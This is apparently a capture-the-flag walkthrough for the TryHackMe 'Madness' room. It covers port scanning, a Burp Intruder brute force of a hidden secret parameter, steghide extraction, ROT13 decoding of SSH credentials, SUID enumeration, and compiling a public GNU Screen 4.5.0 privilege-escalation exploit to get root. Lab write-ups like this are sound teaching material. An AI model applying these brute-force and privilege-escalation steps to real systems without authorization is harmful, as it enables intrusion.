# ğŸ§  TryHackMe - Madness Room (Full Walkthrough)


## ğŸ“Œ Objective

Explore a machine with limited clues. Use smart enumeration, identify hidden files, crack ciphers, and escalate privileges to gain full root access. The goal is to capture:

* ğŸ§â€â™‚ï¸ `user.txt`
* ğŸ‘‘ `root.txt`

Ping the target IP to check connectivity:

```
ping <TARGET_IP>
```

---

## ğŸ” Step 1: Nmap Scan (Find Open Ports)

```
nmap -A -T4 <TARGET_IP>
```

**Result:**

* Port 22 â†’ SSH
* Port 80 â†’ HTTP (Apache server)

This means we have a website hosted and SSH running.

---

## ğŸŒ Step 2: Web Enumeration

### 2.1 Visit the website

Open `http://<TARGET_IP>` in your browser.
You'll see the default **Apache2 Ubuntu** page. Nothing exciting here.

### 2.2 Check Page Source

Right-click > View Page Source.

ğŸ‘‰ At the bottom, youâ€™ll find a comment:

```html
<!-- Check out this image: thm.jpg -->
```

### 2.3 Download the Image

```bash
wget http://<TARGET_IP>/thm.jpg
```

---

## ğŸ–¼ï¸ Step 3: Image File Analysis

Check the file type:

```
file thm.jpg
```

You might get:

```
thm.jpg: PNG image data, ...
```

Wait â€” **file extension is `.jpg`** but type is **PNG**?

### 3.1 Fix the Extension

Rename file:

```
mv thm.jpg thm.png
```

Try opening it with any image viewer. It works âœ…

Look closely at the image or use:

```
strings thm.png | less
```

Sometimes the image might hint at a **hidden directory**.

Letâ€™s say you find something like:

```
/th1s_1s_h1dd3n/
```

---

## ğŸšª Step 4: Hidden Directory & Secret Parameter

Visit:

```
http://<TARGET_IP>/th1s_1s_h1dd3n/
```

Youâ€™ll see:

```
You need to provide the correct secret key between 0 and 99.
```

ğŸ” Step 4: Brute-force the Secret Parameter (with Burp Suite)
Find the correct secret parameter value (0â€“99) by intercepting the request using Burp Suite

#4.1 Intercept the Request

Open Burp Suite and configure your browser to use it as a proxy.

Visit:

   ```
   http://<TARGET_IP>/th1s_1s_h1dd3n/?secret=0
   ```

3. In Burp, intercept the request like:

   ```
   GET /th1s_1s_h1dd3n/?secret=0 HTTP/1.1
   Host: <TARGET_IP>
   User-Agent: Mozilla/5.0 ...
   ```

4. Send the request to **Intruder**:

   * Right-click on the request â†’ *Send to Intruder*

---

#### 4.2 Configure Intruder Payload

* **Target Tab**: Already filled (keep default)
* **Positions Tab**:

  * Click â€œClearâ€
  * Select only the value `0` in `secret=0`
  * Click â€œAddâ€
* It should now look like:

  ```
  /th1s_1s_h1dd3n/?secret=Â§0Â§
  ```

---

#### 4.3 Set the Payload

* Go to **Payloads Tab**
* Payload type: *Numbers*

  * From: `0`
  * To: `99`
  * Step: `1`

---

#### 4.4 Start the Attack

* Click â€œStart Attackâ€
* Look for response differences in **Length** or **Status**

**Example Output:**

| Request | Payload | Length                             |
| ------- | ------- | ---------------------------------- |
| #73     | 73      | 105    â† ğŸ¯ Different from others! |

When `secret=73`, the response length or content will be different, revealing:

> `Here is your file: secret_steg.jpg`



## ğŸ§© Step 5: Steganography â€“ Hidden Data in Image

Download the new file:

```
wget http://<TARGET_IP>/th1s_1s_h1dd3n/secret_steg.jpg
```

Now, try to extract hidden data:

```
steghide extract -sf secret_steg.jpg
```

It will ask for a password â†’ Enter: `73`

âœ… File extracted: `secret.txt`

---

## ğŸ”“ Step 6: Decode the Secret (ROT13)

Inside `secret.txt`, you find something like:

```
Username: wbxre
Password: ########
```

This is encoded using **ROT13**.

Use any ROT13 decoder or command:

```bash
echo "wbxre" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
```

Decoded:

* Username â†’ **joker**
* Password â†’ **#######**

---

## ğŸ” Step 7: SSH Login

Now try logging in:

```
ssh joker@<TARGET_IP>
```

Use password: `######`

Youâ€™re in âœ…

Check for user flag:

```
cat user.txt
```

---

## ğŸ”¼ Step 8: Privilege Escalation

### 8.1 Check Sudo Rights

```
sudo -l
```

No luck?

### 8.2 Check SUID Binaries

```
find / -perm -u=s -type f 2>/dev/null
```

You may find:

```
/usr/bin/screen-4.5.0
```

Search this binary in [Exploit-DB](https://www.exploit-db.com):

ğŸ‘‰ **GNU Screen 4.5.0 - Local Privilege Escalation**

Download & compile the exploit:

```
gcc exploit.c -o screenroot
./screenroot
```

ğŸ‰ You're root now!

```
whoami
# root
```

Get the final flag:

```
cat /root/root.txt
```


